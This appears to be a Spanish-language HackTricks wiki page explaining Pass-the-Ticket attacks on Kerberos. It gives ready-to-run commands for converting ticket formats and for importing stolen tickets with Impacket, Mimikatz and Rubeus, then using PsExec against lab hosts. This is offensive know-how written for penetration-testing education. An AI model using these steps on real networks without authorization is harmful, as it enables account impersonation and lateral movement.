# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Overview

En un ataque Pass-the-Ticket (PtT), un adversario utiliza un ticket de Kerberos robado para autenticarse como el principal del ticket sin poseer la contraseña de esa cuenta. Un ticket-granting ticket (TGT) puede utilizarse para solicitar service tickets, mientras que un service ticket robado está limitado a su servicio de destino y período de validez.<sup>[[1]](#references)</sup>

Para consultar técnicas de adquisición de tickets, véase:

- [Harvesting tickets from Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Harvesting tickets from Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Converting Linux and Windows Ticket Formats

Las cachés de Kerberos suelen aparecer como archivos `ccache` de MIT en Linux y archivos `.kirbi` en Windows. `ticket_converter` convierte estos formatos utilizando un ticket de entrada y una ruta de salida.<sup>[[2]](#references)</sup>
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```
Kekeo también proporciona herramientas para tickets de Kerberos en Windows.<sup>[[3]](#references)</sup>

## Uso de un Ticket

En Linux, apunta `KRB5CCNAME` a la caché e indica a un cliente de Impacket que use Kerberos sin solicitar una contraseña:<sup>[[4]](#references)</sup>
```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
En Windows, Mimikatz o Rubeus pueden importar un ticket `.kirbi` en la sesión de inicio de sesión actual. Usa `klist` para inspeccionar la caché resultante.<sup>[[5]](#references)[[6]](#references)</sup>
```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
La importación de tickets no otorga privilegios más allá de los representados por el ticket y la política de autorización del servicio de destino. Los tickets expirados, revocados, malformados o con un alcance incorrecto pueden fallar.<sup>[[1]](#references)</sup>

Para obtener un contexto más amplio sobre los ataques Kerberos y las técnicas relacionadas de adquisición de tickets, consulta la guía de ataques Kerberos de Tarlogic.<sup>[[7]](#references)</sup>

## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - ejemplos de Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - técnicas de ataque de Kerberos](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
{{#include ../../banners/hacktricks-training.md}}
